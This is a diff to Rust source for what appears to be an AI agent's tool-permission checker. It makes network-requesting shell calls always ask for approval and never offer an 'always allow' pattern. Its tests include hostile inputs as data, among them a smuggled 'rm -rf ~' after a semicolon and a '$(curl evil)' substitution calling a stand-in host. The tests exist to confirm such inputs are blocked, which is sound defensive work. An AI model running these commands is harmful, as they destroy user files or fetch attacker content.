@@ -239,6 +239,9 @@ const WRAPPERS: &[&str] = &[
 /// Pattern "always allow" would record: for `shell`, the first word plus
 /// ` *`; `*` for other tools. `None` for commands that wrap others.
 pub fn pattern_for(call: &ToolCall) -> Option<String> {
+    if wants_network(call) {
+        return None;
+    }
     let subject = subject(call);
     match subject.split_whitespace().next() {
         Some(first) if call.name == "shell" => {
@@ -250,13 +253,19 @@ pub fn pattern_for(call: &ToolCall) -> Option<String> {
     }
 }
 
+/// A `shell` call asking for network (docs/sandbox-design.md): it asks
+/// every time, whatever the allowlist says, and never offers "always".
+fn wants_network(call: &ToolCall) -> bool {
+    call.name == "shell" && call.input["network"] == true
+}
+
 /// Characters that let one shell command run another. A command containing
 /// any of these is never auto-approved by a pattern like `git *`.
 const SHELL_META: &[char] = &[';', '|', '&', '`', '$', '>', '<', '\n', '(', ')'];
 
 pub fn allowed_by(patterns: &[String], call: &ToolCall) -> bool {
     let subject = subject(call);
-    if call.name == "shell" && subject.contains(SHELL_META) {
+    if call.name == "shell" && (subject.contains(SHELL_META) || wants_network(call)) {
         return false;
     }
     patterns.iter().any(|p| {
@@ -328,6 +337,10 @@ mod tests {
         assert!(allowed_by(&pats, &shell("git")));
         assert!(!allowed_by(&pats, &shell("gitk")));
         assert!(!allowed_by(&pats, &shell("git log; rm -rf ~")));
+        let mut push = shell("git push");
+        push.input["network"] = true.into();
+        assert!(!allowed_by(&pats, &push), "network always asks");
+        assert_eq!(pattern_for(&push), None, "and never offers always");
         assert!(!allowed_by(&pats, &shell("git $(curl evil)")));
     }
 
